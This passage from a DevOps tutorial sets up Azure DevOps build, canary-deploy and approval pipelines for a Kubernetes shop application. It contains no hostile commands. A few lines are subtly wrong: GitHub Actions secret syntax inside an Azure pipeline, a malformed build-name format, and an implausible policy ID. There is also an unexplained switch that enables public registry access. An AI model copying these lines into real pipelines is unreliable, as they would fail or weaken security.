Project Settings → Service connections → the old one → ⭐ "Convert"
  Azure DevOps creates the federated credential and switches the auth scheme.
  Every pipeline using that connection keeps working, immediately, with no secret.
```

```powershell
# convert many at once
$org="https://dev.azure.com/shop-devops"; $project="Shop"
$conns = az devops service-endpoint list --project $project -o json | ConvertFrom-Json
foreach ($c in $conns) {
  if ($c.type -eq 'azurerm' -and $c.authorization.scheme -ne 'WorkloadIdentityFederated') {
    Write-Host "converting $($c.name)"
    # PATCH the authorization scheme via the REST API:
    $body = @{ data=$c.data; authorization=@{ scheme='WorkloadIdentityFederated'; parameters=@{} } } | ConvertTo-Json -Depth 5
    Invoke-RestMethod -Method Put -Uri "$org/$project/_apis/serviceendpoint/endpoints/$($c.id)?api-version=7.1" `
      -ContentType 'application/json' -Body $body -Headers @{Authorization="Bearer $env:PAT"}
  }
}
```

### 6.3 The other connections

```bash
# ── Docker Registry (for GHCR / Docker Hub / any) ────────────────
# Project Settings → Service connections → Docker Registry
#   Docker Registry: https://ghcr.io
#   Docker ID:       3558bhk
#   Docker Password: <a GitHub PAT with write:packages>
# ⭐ or use "Others" with a token

# ⭐ for ACR, prefer the ARM connection + `az acr login` over a Docker connection:
- task: AzureCLI@2
  inputs:
    azureSubscription: shop-wif
    scriptType: bash
    inlineScript: |
      az acr login --name $ACR --expose-token --output creds --query accessToken \
        | jq -r .accessToken | docker login $ACR_LOGIN_SERVER -u 00000000-0000-0000-0000-000000000000 --password-stdin
      # ⭐ or, simpler, with a managed identity attached to the agent VMSS:
      az acr login --name $ACR

# ── Kubernetes (a raw cluster, no Azure) ─────────────────────────
kubectl -n shop create sa azdo-deploy
kubectl create clusterrolebinding azdo-deploy \
  --clusterrole=edit --serviceaccount=shop:azdo-deploy
TOKEN=$(kubectl -n shop create token azdo-deploy --duration=8760h)
kubectl config view --raw --minify --flatten > kubeconfig.yaml
# Project Settings → Service connections → Kubernetes →
#   Authentication: Service account
#   Server URL: https://<api-server>:6443
#   Secret: <paste the kubeconfig's certificate-authority-data and the token>
# ⚠️ this IS a long-lived secret. On AKS use the ARM connection instead.

# ── Generic REST (for a deployment window check, a webhook) ──────
# Project Settings → Service connections → Generic → https://api.example.com
#   Username / Password or an Authorization header
```

---

## 7 · Build and push the images

### 7.1 The CI pipeline, complete

```yaml
# .pipelines/ci.yml
name: $(Date:yyyyMMdd).$(Rev:.r)

trigger:
  branches: {include: [main, 'release/*']}
  paths: {include: [apps/**, helm/**, .pipelines/**], exclude: ['**/*.md']}
  batch: true                                 # ⭐ batch pushes: one run for many commits
pr:
  branches: {include: [main]}
  autoCancel: true

pool: {vmImage: ubuntu-latest}

variables:
  - group: shop-common
  - template: .pipelines/variables/common.yml
  - name: REGISTRY
    value: ghcr.io/3558bhk                    # swap to $(ACR_LOGIN_SERVER) for ACR
  - name: IS_PR
    value: $[ eq(variables['Build.Reason'], 'PullRequest') ]

stages:
  # ══════════════════════════════════════════════════════════════
  - stage: Verify
    displayName: 🔍 Lint, test, scan
    jobs:
      # ── the fast gate ─────────────────────────────────────────
      - job: Lint
        displayName: Lint everything
        timeoutInMinutes: 10
        steps:
          - checkout: self
            fetchDepth: 1
          - bash: |
              set -euo pipefail
              echo "==> shellcheck"
              find . -name '*.sh' -not -path './node_modules/*' -exec shellcheck -x {} +
              echo "==> yamllint"
              yamllint -d "{extends: relaxed, rules: {line-length: disable}}" .
              echo "==> hadolint (Dockerfiles)"
              find . -name 'Dockerfile*' -not -path './node_modules/*' -print0 \
                | xargs -0 -I{} docker run --rm -i hadolint/hadolint hadolint - < {}
              echo "==> kubeconform"
              kubeconform -strict -summary -ignore-missing-schemas k8s/ helm/shop/templates/
              echo "==> gitleaks"
              docker run --rm -v "$PWD:/repo" zricethezav/gitleaks:latest \
                detect --source /repo --no-git --redact --exit-code 1 || {
                  echo "##vso[task.logissue type=error]a secret was found in the tree"; exit 1; }
            displayName: Lint
          - bash: ./ci/check-conventions.sh
            displayName: Telemetry conventions

      # ── the per-service test jobs, in parallel ─────────────────
      - ${{ each svc in variables.services }}:
          - job: Test_${{ replace(svc.name, '-', '_') }}
            displayName: '🧪 ${{ svc.name }}'
            timeoutInMinutes: 25
            dependsOn: []                      # ⭐ run in parallel with Lint, not after
            pool: {vmImage: ubuntu-latest}
            variables:
              SERVICE: ${{ svc.name }}
              LANG: ${{ svc.lang }}
            steps:
              - checkout: self
                fetchDepth: 1
              - template: .pipelines/templates/test-${{ svc.lang }}.yml@self
                parameters: {service: ${{ svc.name }}}

      # ── security scanning, also in parallel ────────────────────
      - job: SecurityScan
        displayName: 🛡️ Security
        timeoutInMinutes: 15
        dependsOn: []
        steps:
          - checkout: self
            fetchDepth: 1
          - bash: |
              set -euo pipefail
              mkdir -p reports
              # ⭐ Semgrep — SAST
              docker run --rm -v "$PWD:/src" semgrep/semgrep \
                semgrep scan --config auto --config p/owasp-top-ten \
                  --json --output /src/reports/semgrep.json /src || true
              jq '[.results[] | select(.extra.severity=="ERROR")] | length' reports/semgrep.json
              # ⭐ Trivy on the filesystem (IaC + dependencies)
              docker run --rm -v "$PWD:/src" aquasec/trivy:latest \
                fs --scanners vuln,misconfig,secret --exit-code 1 \
                --severity CRITICAL,HIGH --ignore-unfixed /src \
                --format sarif --output /src/reports/trivy-fs.sarif || true
              # ⭐ Trivy on the Helm chart
              docker run --rm -v "$PWD:/src" aquasec/trivy:latest \
                config --exit-code 1 --severity CRITICAL,HIGH /src/helm/shop \
                --format table --output /src/reports/trivy-helm.txt || true
            displayName: Semgrep + Trivy
          - task: ComponentGovernanceComponentDetection@0
            displayName: Dependency scanning (Microsoft)
            inputs:
              scanType: Register
              verbosity: Detailed
              alertWarningLevel: High
              failOnAlert: true
              ignoreDirectories: 'node_modules,vendor'
          - publish: reports
            artifact: security-reports
            condition: always()
            displayName: Publish the security reports

  # ══════════════════════════════════════════════════════════════
  - stage: Build
    displayName: 🏗️ Build and push images
    dependsOn: Verify
    condition: and(succeeded(), ne(variables.IS_PR, 'True'))   # ⭐ don't push on a PR
    jobs:
      - ${{ each svc in variables.services }}:
          - job: Build_${{ replace(svc.name, '-', '_') }}
            displayName: '📦 ${{ svc.name }}'
            timeoutInMinutes: 30
            pool: {vmImage: ubuntu-latest}
            steps:
              - checkout: self
                fetchDepth: 1
              - bash: |
                  echo "${{ secrets.REGISTRY_TOKEN }}" | docker login ghcr.io -u 3558bhk --password-stdin
                displayName: docker login
              - template: .pipelines/templates/build-image.yml@self
                parameters:
                  service: ${{ svc.name }}
                  registry: $(REGISTRY)
                  scan: true
              - publish: $(Build.ArtifactStagingDirectory)
                artifact: image-info-${{ svc.name }}
                displayName: Publish the digest and SBOM

  # ══════════════════════════════════════════════════════════════
  - stage: Package
    displayName: 📋 Render the manifests
    dependsOn: Build
    jobs:
      - job: Render
        displayName: helm template
        steps:
          - checkout: self
          - ${{ each svc in variables.services }}:
              - download: current
                artifact: image-info-${{ svc.name }}
          - bash: |
              set -euo pipefail
              mkdir -p $(Build.ArtifactStagingDirectory)/manifests
              for env in dev staging production; do
                helm template shop ./helm/shop \
                  --namespace shop \
                  --values helm/values/base.yaml \
                  --values helm/values/$env.yaml \
                  --set-string image.revision=$(Build.SourceVersion) \
                  > $(Build.ArtifactStagingDirectory)/manifests/$env.yaml
                echo "==> validating $env"
                kubeconform -strict -summary $(Build.ArtifactStagingDirectory)/manifests/$env.yaml
              done
              # ⭐ record the exact digests in a machine-readable file
              jq -n --arg sha "$(Build.SourceVersion)" --arg build "$(Build.BuildId)" \
                '{revision:$sha, build:$build, builtAt:(now|todate)}' \
                > $(Build.ArtifactStagingDirectory)/manifests/build-info.json
            displayName: Render and validate
          - publish: $(Build.ArtifactStagingDirectory)/manifests
            artifact: manifests
```

### 7.2 Azure Container Registry specifics

```bash
# the ACR tasks that can build IN Azure (no agent needed) ⭐
az acr build --registry $ACR --image shop-api:$(git rev-parse --short HEAD) \
  --file apps/shop-api/Dockerfile apps/shop-api
az acr task create --name shop-api-ci --registry $ACR \
  --image shop-api:{{.Run.ID}} --context https://github.com/3558Bhk/shop.git#main \
  --file apps/shop-api/Dockerfile --git-access-token <PAT> \
  --trigger-mode Enabled
az acr task run --name shop-api-ci --registry $ACR
az acr task list-runs --registry $ACR -o table
# ⭐ ACR Tasks gives you 3600 free build seconds/day — enough for a small team,
#    and it removes the need for a Docker-capable agent entirely.

# retention and immutability
az acr update -n $ACR --public-network-enabled true
az acr config retention update -n $ACR --status enabled --days 30 --type UnTaggedManifests
# ⭐ immutable tags (prevents a tag from being re-pushed with different bytes):
az policy assignment create --name acr-immutable-tags \
  --scope $(az acr show -n $ACR --query id -o tsv) \
  --policy '496223c3adaf46a1701371c2a3e0b1b4'   # the built-in policy definition ID
# or in the portal: Container registry → Configuration → Immutable tags: Enabled

# garbage collection (a scheduled ACR Task)
az acr run --cmd "acr purge --filter 'shop-api:sha-.*' --ago 30d --untagged" /dev/null --registry $ACR

# ⭐ pull into Kubernetes without imagePullSecrets: attach the ACR to the AKS cluster
az aks update -g rg-shop -n shop-dev --attach-acr $ACR
# this grants the kubelet's managed identity the AcrPull role. No secret in the cluster.
# for a NON-AKS cluster:
az ad sp create-for-rbac --name shop-acr-pull --role AcrPull \
  --scopes $(az acr show -n $ACR --query id -o tsv) --years 1
kubectl -n shop create secret docker-registry acr-pull \
  --docker-server=$ACR_LOGIN_SERVER --docker-username=<appId> --docker-password=<password>
```

---

## 8 · Deploy to Kubernetes

### 8.1 The deploy script (tool-agnostic ⭐)

```bash
# scripts/deploy.sh — ⭐ the SAME script works in all three CI tools
#!/usr/bin/env bash
# usage: deploy.sh <environment> <revision> [digest-file]
set -euo pipefail

ENV="${1:?usage: deploy.sh <env> <revision>}"
REVISION="${2:?usage: deploy.sh <env> <revision>}"
NAMESPACE="${NAMESPACE:-shop}"
RELEASE="${RELEASE:-shop}"
CHART="${CHART:-helm/shop}"
DRY_RUN="${DRY_RUN:-false}"
ATOMIC="${ATOMIC:-true}"
TIMEOUT="${TIMEOUT:-10m}"

log() { printf '\033[1;34m==> %s\033[0m\n' "$*"; }
die() { printf '\033[1;31m✖ %s\033[0m\n' "$*" >&2; exit 1; }

# ── 1. preconditions ────────────────────────────────────────────
command -v helm    >/dev/null || die "helm not installed"
command -v kubectl >/dev/null || die "kubectl not installed"
kubectl cluster-info >/dev/null 2>&1 || die "cannot reach the cluster"
[[ -d "$CHART" ]] || die "chart $CHART not found"

# ── 2. the digests (built ONCE, promoted by digest) ⭐ ──────────
declare -A DIGESTS
for svc in shop-api checkout order-worker shop-ui payment-mock; do
  f="artifacts/${svc}.digest"
  if [[ -f "$f" ]]; then DIGESTS[$svc]=$(cat "$f"); else DIGESTS[$svc]=""; fi
done
log "deploying $ENV at revision ${REVISION:0:7}"

# ── 3. render and validate BEFORE applying ⭐ ───────────────────
log "rendering"
RENDERED=$(mktemp)
trap 'rm -f "$RENDERED"' EXIT
helm template "$RELEASE" "$CHART" \
  --namespace "$NAMESPACE" \
  --values helm/values/base.yaml \
  --values "helm/values/${ENV}.yaml" \
  --set-string image.revision="$REVISION" \
  $(for svc in "${!DIGESTS[@]}"; do [[ -n "${DIGESTS[$svc]}" ]] && echo "--set ${svc}.image.digest=${DIGESTS[$svc]}"; done) \
  > "$RENDERED"

command -v kubeconform >/dev/null && kubeconform -strict -summary -ignore-missing-schemas "$RENDERED"
command -v kubectl >/dev/null && kubectl apply --dry-run=server -f "$RENDERED" >/dev/null \
  || log "  (server dry-run unavailable)"

# ⭐ the diff — what will actually change
if helm status "$RELEASE" -n "$NAMESPACE" >/dev/null 2>&1; then
  log "the diff against the live release:"
  helm diff upgrade "$RELEASE" "$CHART" -n "$NAMESPACE" \
    --values helm/values/base.yaml --values "helm/values/${ENV}.yaml" \
    --set-string image.revision="$REVISION" 2>/dev/null | head -80 || true
fi

# ── 4. deploy ───────────────────────────────────────────────────
if [[ "$DRY_RUN" == "true" ]]; then
  log "DRY_RUN=true — stopping before the apply"
  kubectl apply --dry-run=client -f "$RENDERED" | tail -20
  exit 0
fi

ATOMIC_FLAG=""
[[ "$ATOMIC" == "true" ]] && ATOMIC_FLAG="--atomic --timeout $TIMEOUT"
# ⭐⭐ --atomic = wait for readiness AND roll back automatically on failure or timeout

log "helm upgrade --install"
if ! helm upgrade --install "$RELEASE" "$CHART" \
    --namespace "$NAMESPACE" --create-namespace \
    --values helm/values/base.yaml \
    --values "helm/values/${ENV}.yaml" \
    --set-string image.revision="$REVISION" \
    --set-string "annotations.deployed-at=$(date -u +%FT%TZ)" \
    --set-string "annotations.deployed-by=${DEPLOYED_BY:-ci}" \
    --set-string "annotations.deployed-build=${BUILD_ID:-local}" \
    $(for svc in "${!DIGESTS[@]}"; do [[ -n "${DIGESTS[$svc]}" ]] && echo "--set ${svc}.image.digest=${DIGESTS[$svc]}"; done) \
    --wait $ATOMIC_FLAG; then

  log "⛔ the upgrade FAILED"
  # ⭐ capture the evidence BEFORE rolling back
  kubectl -n "$NAMESPACE" get pods -o wide                      || true
  kubectl -n "$NAMESPACE" get events --sort-by=.lastTimestamp   || true
  kubectl -n "$NAMESPACE" describe pods -l app.kubernetes.io/part-of=shop || true
  for svc in shop-api checkout order-worker shop-ui; do
    kubectl -n "$NAMESPACE" logs deploy/$svc --tail=100 --all-containers 2>/dev/null || true
  done
  helm history "$RELEASE" -n "$NAMESPACE" | tail -5 || true

  if [[ "$ATOMIC" == "true" ]]; then
    log "helm already rolled back (--atomic)"
  else
    PREV=$(helm history "$RELEASE" -n "$NAMESPACE" -o json | jq -r '.[-2].revision // empty')
    [[ -n "$PREV" ]] && { log "rolling back to revision $PREV"; helm rollback "$RELEASE" "$PREV" -n "$NAMESPACE" --wait; }
  fi
  exit 1
fi

# ── 5. verify ───────────────────────────────────────────────────
log "waiting for the rollout"
for svc in shop-api checkout order-worker shop-ui payment-mock; do
  kubectl -n "$NAMESPACE" rollout status "deploy/$svc" --timeout=300s 2>/dev/null || \
    log "  ⚠️  $svc did not report a rollout (it may not exist in $ENV)"
done

log "asserting the running version"
ACTUAL=$(kubectl -n "$NAMESPACE" get deploy shop-api \
  -o jsonpath='{.spec.template.spec.containers[0].image}' 2>/dev/null || echo "?")
log "  shop-api image: $ACTUAL"
if [[ -n "${DIGESTS[shop-api]}" && "$ACTUAL" != *"${DIGESTS[shop-api]}"* ]]; then
  die "the running image ($ACTUAL) does not match the deployed digest (${DIGESTS[shop-api]})"
fi

# ── 6. the smoke test ┭ ────────────────────────────────────────
log "running the smoke test"
kubectl -n "$NAMESPACE" port-forward svc/shop-api 18080:80 >/dev/null 2>&1 &
PF=$!; trap 'kill $PF 2>/dev/null; rm -f "$RENDERED"' EXIT
sleep 6
SMOKE_URL="${SMOKE_URL:-http://localhost:18080}" \
EXPECTED_SHA="$REVISION" \
  ./scripts/smoke-test.sh "$SMOKE_URL" || {
    log "⛔ the smoke test FAILED — rolling back"
    PREV=$(helm history "$RELEASE" -n "$NAMESPACE" -o json | jq -r '.[-2].revision // empty')
    [[ -n "$PREV" ]] && helm rollback "$RELEASE" "$PREV" -n "$NAMESPACE" --wait
    exit 1
  }

log "✅ deployed $ENV at ${REVISION:0:7}"
```

```bash
chmod +x scripts/deploy.sh
# and per-environment values
cat > helm/values/base.yaml <<'EOF'
image:
  repository: ghcr.io/3558bhk/shop-api
  pullPolicy: IfNotPresent
replicaCount: 2
resources:
  requests: {cpu: 250m, memory: 512Mi}
  limits:   {memory: 1Gi}
EOF
cat > helm/values/dev.yaml <<'EOF'
replicaCount: 1
ingress: {enabled: false}
resources: {requests: {cpu: 100m, memory: 256Mi}, limits: {memory: 512Mi}}
EOF
cat > helm/values/staging.yaml <<'EOF'
replicaCount: 3
EOF
cat > helm/values/production.yaml <<'EOF'
replicaCount: 6
strategy: {type: RollingUpdate, rollingUpdate: {maxSurge: 1, maxUnavailable: 0}}
podDisruptionBudget: {enabled: true, minAvailable: 4}
topologySpreadConstraints: [{maxSkew: 1, topologyKey: topology.kubernetes.io/zone,
                             whenUnsatisfiable: ScheduleAnyway}]
resources: {requests: {cpu: 500m, memory: 1Gi}, limits: {memory: 2Gi}}
hpa: {enabled: true, minReplicas: 6, maxReplicas: 20, targetCPUUtilizationPercentage: 70}
EOF
```

### 8.2 The CD pipeline

```yaml
# .pipelines/cd.yml
name: cd-$(Date:yyyyMMdd).$(Rev:.r)

trigger: none                     # ⭐ CD is triggered by CI, or manually, or on a schedule

resources:
  pipelines:
    - pipeline: ci                       # ⭐⭐ trigger on the CI pipeline's completion
      source: shop-ci
      trigger:
        branches: {include: [main]}
        stages: [Build]                   # ⭐ only when the Build stage succeeds
  repositories:
    - repository: templates
      type: github
      name: 3558Bhk/pipeline-templates
      ref: refs/tags/v2.3.1
      endpoint: github-shop

pool: {vmImage: ubuntu-latest}

variables:
  - group: shop-common

parameters:
  - name: targetEnvironment
    type: string
    default: dev
    values: [dev, staging, production]
  - name: dryRun
    type: boolean
    default: false

stages:
  # ══════════════════════════════════════════════════════════════
  - stage: Download
    displayName: 📥 Collect the build output
    jobs:
      - job: Gather
        steps:
          - checkout: self
          - download: ci                       # ⭐⭐ artifacts from the CI run
            artifact: manifests
            patterns: '**'
          - download: ci
            artifact: image-info-shop-api
          - download: ci
            artifact: security-reports
          - bash: |
              set -euo pipefail
              mkdir -p artifacts
              for f in $(Pipeline.Workspace)/ci/image-info-*/*.digest; do
                svc=$(basename "$f" .digest); cp "$f" "artifacts/$svc.digest"
                echo "  $svc → $(cat $f)"
              done
              # ⭐ the security gate: refuse to promote a run with a CRITICAL finding
              if [[ -f $(Pipeline.Workspace)/ci/security-reports/semgrep.json ]]; then
                n=$(jq '[.results[] | select(.extra.severity=="ERROR")] | length' \
                     $(Pipeline.Workspace)/ci/security-reports/semgrep.json)
                echo "##vso[build.addbuildtag]semgrep-errors-$n"
                if (( n > 0 )); then
                  echo "##vso[task.logissue type=error]$n high-severity Semgrep findings"
                  exit 1
                fi
              fi
            displayName: Collect digests and re-check security
          - publish: artifacts
            artifact: digests

  # ══════════════════════════════════════════════════════════════
  - stage: DeployDev
    displayName: 🌱 dev
    dependsOn: Download
    jobs:
      - deployment: DeployDev
        environment: dev                        # ⭐ no approvals on dev
        pool: {name: shop-agents, demands: kubectl}
        strategy:
          runOnce:
            deploy:
              steps:
                - checkout: self
                - download: current
                  artifact: manifests
                - download: current
                  artifact: digests
                - bash: |
                    ENV=dev DRY_RUN=${{ parameters.dryRun }} DEPLOYED_BY=azure-pipelines \
                    BUILD_ID=$(Build.BuildId) \
                      ./scripts/deploy.sh dev "$(Build.SourceVersion)"
                  displayName: Deploy to dev

  # ══════════════════════════════════════════════════════════════
  - stage: DeployStaging
    displayName: 🧪 staging
    dependsOn: DeployDev
    condition: and(succeeded(), ne('${{ parameters.targetEnvironment }}', 'dev'))
    jobs:
      - deployment: DeployStaging
        environment: staging                    # ⭐ no approvals, but branch control
        pool: {vmImage: ubuntu-latest}
        strategy:
          runOnce:
            preDeploy:                            # ⭐ runs BEFORE the deploy
              steps:
                - bash: ./scripts/pre-deploy-checks.sh staging
            deploy:
              steps:
                - checkout: self
                - download: current
                  artifact: manifests
                - download: current
                  artifact: digests
                - bash: ./scripts/deploy.sh staging "$(Build.SourceVersion)"
            postRouteTraffic:
              steps:
                - bash: ./scripts/e2e-tests.sh staging       # ⭐ Playwright
                  timeoutInMinutes: 20
            on:
              success:
                steps:
                  - bash: |
                      echo "##vso[build.addbuildtag]staging-ok"
                      ./scripts/notify.sh slack "#shop-ci" \
                        "✅ staging deployed: $(Build.SourceVersion) ($(Build.BuildNumber))"
              failure:
                steps:
                  - bash: ./scripts/notify.sh slack "#shop-oncall" \
                      "⛔ staging deploy FAILED: $(Build.BuildNumber) $AGENT_JOBSTATUS"

  # ══════════════════════════════════════════════════════════════
  - stage: DeployProduction
    displayName: 🚀 production
    dependsOn: DeployStaging
    condition: |
      and(
        succeeded(),
        eq('${{ parameters.targetEnvironment }}', 'production'),
        eq(variables['Build.SourceBranchName'], 'main')
      )
    jobs:
      # ⭐⭐ the CANARY strategy, built in
      - deployment: CanaryProduction
        environment: production
        pool: {vmImage: ubuntu-latest}
        timeoutInMinutes: 90
        strategy:
          canary:
            increments: [10, 25, 50, 100]           # ⭐ the traffic/pod percentages
            preDeploy:
              steps:
                - bash: |
                    set -euo pipefail
                    echo "==> pre-deploy checks"
                    ./scripts/pre-deploy-checks.sh production
                    # ⭐ the observability gate: refuse to deploy if an SLO is burning
                    BR=$(curl -sG "$PROMETHEUS/api/v1/query" --data-urlencode \
                      'query=sum(rate(http_server_requests_seconds_count{namespace="shop",status=~"5.."}[1h])) / (0.001 * sum(rate(http_server_requests_seconds_count{namespace="shop"}[1h])))' \
                      | jq -r '.data.result[0].value[1] // 0')
                    echo "  current burn rate: ${BR}×"
                    awk "BEGIN{exit !($BR > 2)}" && {
                      echo "##vso[task.logissue type=error]an SLO is already burning (${BR}×) — refusing to deploy"
                      exit 1; }
                    # ⭐ and no active incidents
                    n=$(curl -s "$ALERTMANAGER/api/v2/alerts" | jq '[.[] | select(.labels.severity=="critical")] | length')
                    (( n == 0 )) || { echo "⛔ $n critical alerts are firing"; exit 1; }
            deploy:
              steps:
                - checkout: self
                - download: current
                  artifact: manifests
                - download: current
                  artifact: digests
                - bash: |
                    # ⭐ deploy to the CANARY deployment only
                    ./scripts/deploy-canary.sh production "$(Build.SourceVersion)" "$(CANARY_INCREMENT)"
                  displayName: Deploy the canary increment
            routeTraffic:
              steps:
                - bash: |
                    echo "==> shifting $(CANARY_INCREMENT)% of traffic to the canary"
                    kubectl -n shop argo rollouts set weight shop-api $(CANARY_INCREMENT) 2>/dev/null || \
                    kubectl -n shop patch ingress shop -p "{\"metadata\":{\"annotations\":{\"nginx.ingress.kubernetes.io/canary-weight\":\"$(CANARY_INCREMENT)\"}}}"
            postRouteTraffic:
              pauseTaskDuration: 10m                 # ⭐⭐ SOAK TIME between increments
              steps:
                - bash: |
                    set -euo pipefail
                    echo "==> analysing the canary against the stable version"
                    ./scripts/analyse-canary.sh production || {
                      echo "##vso[task.logissue type=error]the canary is worse than stable — aborting"
                      exit 1; }
            on:
              failure:
                steps:
                  - bash: |
                      echo "⛔ ABORTING and rolling back"
                      kubectl -n shop argo rollouts abort shop-api 2>/dev/null || \
                      helm rollback shop -n shop --wait
                      ./scripts/notify.sh slack "#shop-oncall" \
                        "🔴 the production canary FAILED and was rolled back: $(Build.BuildNumber)"
                      ./scripts/incident-report.sh "canary-failure" "$(Build.BuildId)"
                  - task: PublishTestResults@2
                    condition: always()
                    inputs: {testResultsFormat: JUnit, testResultsFiles: 'reports/*.xml'}
              success:
                steps:
                  - bash: |
                      echo "✅ production is at $(Build.SourceVersion)"
                      git config user.name  "shop-ci[bot]"
                      git config user.email "shop-ci@shop.example.com"
                      git tag -f "prod-$(date -u +%F)" && git push -f origin "prod-$(date -u +%F)"
                      ./scripts/notify.sh slack "#shop-releases" \
                        "🚀 production: $(Build.SourceVersion) · build $(Build.BuildNumber) · approved by $(APPROVER)"
                      ./scripts/record-dora.sh production "$(Build.SourceVersion)"
```

```bash
# scripts/analyse-canary.sh — ⭐ the automated promotion gate
#!/usr/bin/env bash
set -euo pipefail
ENV="${1:-production}"; PROM="${PROMETHEUS:-http://localhost:9090}"
q() { curl -sG "$PROM/api/v1/query" --data-urlencode "query=$1" | jq -r '.data.result[0].value[1] // "0"'; }

CAN_ERR=$(q 'sum(rate(http_server_requests_seconds_count{namespace="shop",version="canary",status=~"5.."}[5m])) / clamp_min(sum(rate(http_server_requests_seconds_count{namespace="shop",version="canary"}[5m])),0.001)')
STA_ERR=$(q 'sum(rate(http_server_requests_seconds_count{namespace="shop",version="stable",status=~"5.."}[5m])) / clamp_min(sum(rate(http_server_requests_seconds_count{namespace="shop",version="stable"}[5m])),0.001)')
CAN_P99=$(q 'histogram_quantile(0.99, sum by (le) (rate(http_server_requests_seconds_bucket{namespace="shop",version="canary"}[5m])))')
STA_P99=$(q 'histogram_quantile(0.99, sum by (le) (rate(http_server_requests_seconds_bucket{namespace="shop",version="stable"}[5m])))')
CAN_CPU=$(q 'sum(rate(container_cpu_cfs_throttled_periods_total{namespace="shop",version="canary"}[5m])) / clamp_min(sum(rate(container_cpu_cfs_periods_total{namespace="shop",version="canary"}[5m])),0.001)')

printf '           canary     stable    ratio\n'
printf 'errors     %-10s %-9s\n' "$CAN_ERR" "$STA_ERR"
printf 'p99        %-10s %-9s\n' "$CAN_P99" "$STA_P99"
printf 'throttled  %-10s\n' "$CAN_CPU"

fail=0
awk "BEGIN{exit !($CAN_ERR > ($STA_ERR * 1.5 + 0.001))}" && { echo "⛔ the canary error rate is >1.5× stable"; fail=1; }
awk "BEGIN{exit !($CAN_P99 > ($STA_P99 * 1.5 + 0.1))}"   && { echo "⛔ the canary p99 is >1.5× stable"; fail=1; }
awk "BEGIN{exit !($CAN_CPU > 0.25)}"                     && { echo "⛔ the canary is CPU-throttled"; fail=1; }
(( fail == 0 )) && echo "✅ the canary is healthy" || exit 1
```

---

## 9 · Environments, approvals and checks ⭐⭐

This is where Azure DevOps is genuinely ahead of GitHub Actions.

### 9.1 Create the environments

```
Pipelines → Environments → New environment
  Name: production
  Description: The live shop. Requires SRE approval and a change ticket.
  Resource: (none — or add a Kubernetes/Virtual Machine resource for per-resource history)
```

```bash
# or via the REST API
curl -s -u ":$PAT" -XPOST "$ORG/Shop/_apis/distributedtask/environments?api-version=7.1" \
  -H 'Content-Type: application/json' -d '{
    "name": "production",
    "description": "The live shop. Requires SRE approval."
  }' | jq .

# list them
curl -s -u ":$PAT" "$ORG/Shop/_apis/distributedtask/environments?api-version=7.1" | jq '.value[].name'
```

### 9.2 The checks — all six

```
Environment: production → ⋯ → Approvals and checks → +

┌───────────────────────────────────────────────────────────────────────────┐
│ 1. ⭐ APPROVALS                                                           │
│    Required reviewers:  [SRE Leads] [Payments Lead]                       │
│    ⭐ "Allow requestors to approve their own runs":  OFF                  │
│    Instructions for reviewers:                                            │
│      "Verify: (1) the staging smoke test passed, (2) the diff touches     │
│       only apps/shop-api, (3) a change ticket is linked, (4) it is not    │
│       Friday after 16:00 IST. Then approve."                              │
│    ⭐ this text appears IN the approval dialog. Use it as the checklist.  │
│                                                                           │
│ 2. ⭐ BRANCH CONTROL                                                      │
│    Allowed repositories: Shop/shop                                        │
│    Allowed branches:  main, release/*                                     │
│    ⭐ "Allow deployments from expired/failed builds": OFF                 │
│    → only an artifact built from `main` can ever reach production         │
│                                                                           │
│ 3. ⭐ BUSINESS HOURS (the deployment window)                              │
│    Time zone: (UTC+05:30) Chennai, Kolkata, Mumbai                       │
│    Days: Mon Tue Wed Thu    (⭐ not Friday)                               │
│    Start: 10:00   End: 17:00                                              │
│    Delay: 0 minutes                                                       │
│    → a run queued at 19:00 WAITS until 10:00 Monday                       │
│                                                                           │
│ 4. ⭐ REQUIRED TEMPLATES                                                  │
│    Template type: YAML                                                     │
│    Repository: Shop/policy-pipelines                                      │
│    Path: templates/pre-production-gate.yml                                │
│    Version: Latest from the default branch                                 │
│    ⭐ "Evaluate system artifacts": ON                                      │
│    → ANOTHER pipeline runs as a gate. Put your policy checks here:        │
│      is the artifact signed? does the SBOM have no CRITICAL CVEs?         │
│      is there a linked change ticket? does the diff touch a CODEOWNERS    │
│      path that needs a second approval?                                    │
│                                                                           │
│ 5. INVOKE REST API ⭐ (the integration point)                             │
│    URL: https://servicenow.example.com/api/change/create                  │
│    Method: POST   Headers: Content-Type: application/json                 │
│    Body: {"short_description":"Deploy $(release.name) to production",      │
│           "requested_by":"$(release.requestedFor)"}                       │
│    Completion event: RequestBody  Callback token: <secret>                │
│    ⭐ Azure DevOps waits for ServiceNow to POST back with a decision.     │
│    Success criteria: eq(root['status'], 'approved')                       │
│    → your change-management system becomes the gate.                       │
│                                                                           │
│ 6. PARALLEL DEPLOYMENTS                                                    │
│    Strategy: ⭐ "Only allow one active deployment at a time"              │
│    → the built-in equivalent of Jenkins' `lock`                           │
│                                                                           │
│ (also available) QUERY WORK ITEMS — require a linked Board item           │
│ (also available) QUERY AZURE BOARDS WORK ITEM STATE                        │
└───────────────────────────────────────────────────────────────────────────┘
```

### 9.3 The pre-production gate pipeline (check #4)

```yaml
# policy-pipelines/templates/pre-production-gate.yml
# ⭐ runs as a REQUIRED TEMPLATE check before the production environment.
# It cannot be bypassed by the deploying pipeline — it's enforced by the platform.
parameters:
  - name: maxCriticalVulnerabilities
    type: number
    default: 0
  - name: requireSignedImage
    type: boolean
    default: true
  - name: requireChangeTicket
    type: boolean
    default: true

pool: {vmImage: ubuntu-latest}

steps:
  - checkout: self

  - download: current
    artifact: image-info-shop-api
    displayName: Download the artifact metadata

  - bash: |
      set -euo pipefail
      fail=0
      DIGEST=$(cat $(Pipeline.Workspace)/image-info-shop-api/shop-api.digest)
      IMAGE="ghcr.io/3558bhk/shop-api@$DIGEST"
      echo "==> gating $IMAGE"

      # 1. ⭐ is the image SIGNED?
      if [[ "${{ parameters.requireSignedImage }}" == "True" ]]; then
        if cosign verify "$IMAGE" \
             --certificate-oidc-issuer=https://dev.azure.com/shop-devops \
             --certificate-identity-regexp='.*Shop.*' 2>/dev/null; then
          echo "  ✅ signed"; else echo "  ⛔ NOT signed"; fail=1; fi
      fi

      # 2. ⭐ does the SBOM have CRITICAL vulnerabilities?
      SBOM=$(Pipeline.Workspace)/image-info-shop-api/shop-api.sbom.cdx.json
      if [[ -f "$SBOM" ]]; then
        n=$(trivy sbom --severity CRITICAL --quiet --format json "$SBOM" \
             | jq '[.Results[].Vulnerabilities[]?] | length')
        echo "  critical vulnerabilities: $n"
        (( n > ${{ parameters.maxCriticalVulnerabilities }} )) && { echo "  ⛔ too many"; fail=1; }
      else
